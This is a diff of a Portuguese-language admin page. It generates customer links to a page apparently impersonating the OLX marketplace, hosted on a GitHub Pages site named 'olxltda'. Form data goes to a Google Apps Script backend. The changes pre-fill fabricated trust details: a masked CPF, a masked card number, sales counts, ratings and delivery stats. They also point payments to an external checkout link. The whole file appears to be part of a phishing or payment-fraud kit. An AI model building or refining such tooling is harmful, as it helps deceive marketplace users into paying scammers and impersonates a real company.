@@ -35,7 +35,7 @@
   button#btnSalvar:hover { background:#009e8e; transform: translateY(-2px); }
   button:disabled { background: #555; cursor: not-allowed; opacity: 0.7; }
   
-  /* --- MODAL (Pop-up) --- */
+  /* --- MODAL --- */
   .modal { 
     display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
     background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index: 1000;
@@ -67,37 +67,44 @@
 <form id="adminForm">
   <h2>Novo Pedido</h2>
   
-  <label>Valor Total (Ex: R$ 1.200,00)</label>
-  <input type="text" name="valor" required placeholder="Digite o valor final">
-
   <label>Nome do Comprador</label>
   <input type="text" name="comprador" required placeholder="Nome completo">
-
-  <label>Taxa de Serviço (Ex: R$ 50,00)</label>
-  <input type="text" name="taxa" placeholder="Valor da taxa">
-
+  
   <label>Link Pagamento (Checkout)</label>
-  <input type="text" name="linkPagamento" placeholder="https://seuchekout.com...">
+  <input type="text" name="linkPagamento" placeholder="https://go.perfectpay...">
 
-  <label>Frete (Opcional)</label>
-  <input type="text" name="frete" placeholder="Ex: Grátis">
+  <label>Taxa de Serviço</label>
+  <input type="text" name="taxa" placeholder="Ex: R$ 50,00">
 
-  <label>Tarifa (Opcional)</label>
-  <input type="text" name="tarifa" placeholder="Ex: Inclusa">
+  <hr style="border:0; border-top:1px solid #444; margin: 20px 0;">
+  <p style="font-size:12px; color:#888; text-align:center; letter-spacing:1px;">DADOS PRÉ-DEFINIDOS</p>
 
-  <label>CPF (Opcional)</label>
-  <input type="text" name="cpf">
+  <label>Valor Total</label>
+  <input type="text" name="valor" value="R$ 1.000,00">
 
-  <div style="display:flex; gap:10px;">
-    <div style="flex:1">
-      <label>Vendas</label>
-      <input type="text" name="vendas" value="+100 vendas">
-    </div>
-    <div style="flex:1">
-      <label>Atendimento</label>
-      <input type="text" name="atendimento" value="Rápido">
-    </div>
-  </div>
+  <label>Prazo</label>
+  <input type="text" name="prazo" value="12 horas">
+
+  <label>Frete</label>
+  <input type="text" name="frete" value="R$ 0,00">
+
+  <label>Tarifa</label>
+  <input type="text" name="tarifa" value="R$ 0,00">
+
+  <label>CPF Mascarado</label>
+  <input type="text" name="cpf" value="406.***.***.01">
+
+  <label>Cartão Mascarado</label>
+  <input type="text" name="cartao" value="Mastercard 4588">
+
+  <label>Histórico de Vendas</label>
+  <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">
+
+  <label>Avaliação Atendimento</label>
+  <input type="text" name="atendimento" value="Avaliação 4.7/5.0">
+
+  <label>Taxa de Entrega</label>
+  <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">
 
   <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
 </form>
@@ -116,13 +123,13 @@
 
 <script>
 // ========================================================
-// ⚙️ CONFIGURAÇÃO OBRIGATÓRIA
+// ⚙️ CONFIGURAÇÃO
 // ========================================================
 
-// 1. Cole aqui a URL do seu Google Script (Implantar > Web App)
+// 1. URL do Google Script (Backend)
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
 
-// 2. Cole aqui a URL do seu site GitHub Pages (Tela do Cliente)
+// 2. URL do Site do Cliente
 const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
 
 // ========================================================
@@ -136,32 +143,24 @@ const btnCopy = document.getElementById('btnCopy');
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
   
-  // Bloqueia botão
   btnSalvar.textContent = "Processando...";
   btnSalvar.disabled = true;
 
-  // Coleta dados do form
   const data = {};
   new FormData(form).forEach((v, k) => data[k] = v);
 
   try {
-    // TÉCNICA ANTI-CORS: text/plain + redirect:follow
     const res = await fetch(BACKEND_URL, {
       method: 'POST',
       redirect: 'follow', 
-      headers: {
-        'Content-Type': 'text/plain;charset=utf-8', 
-      },
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
       body: JSON.stringify(data)
     });
     
     const json = await res.json();
 
     if (json.status === 'success') {
-      // Monta o link final: URL do Site + ?id= + ID gerado pelo Google
       const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
-      
-      // Exibe Modal
       linkDisplay.textContent = linkPronto;
       modal.classList.add('active');
     } else {
@@ -170,15 +169,13 @@ form.addEventListener('submit', async (e) => {
 
   } catch (err) {
     console.error(err);
-    alert('❌ ERRO DE PERMISSÃO OU CONEXÃO!\n\nVerifique:\n1. Se você implantou o Script como "Qualquer pessoa" (Anyone).\n2. Se a URL do Script está correta.');
+    alert('Erro de conexão!');
   } finally {
-    // Libera botão
     btnSalvar.textContent = "Gerar Link do Cliente";
     btnSalvar.disabled = false;
   }
 });
 
-// Botão Copiar
 btnCopy.addEventListener('click', () => {
   navigator.clipboard.writeText(linkDisplay.textContent);
   const original = btnCopy.textContent;
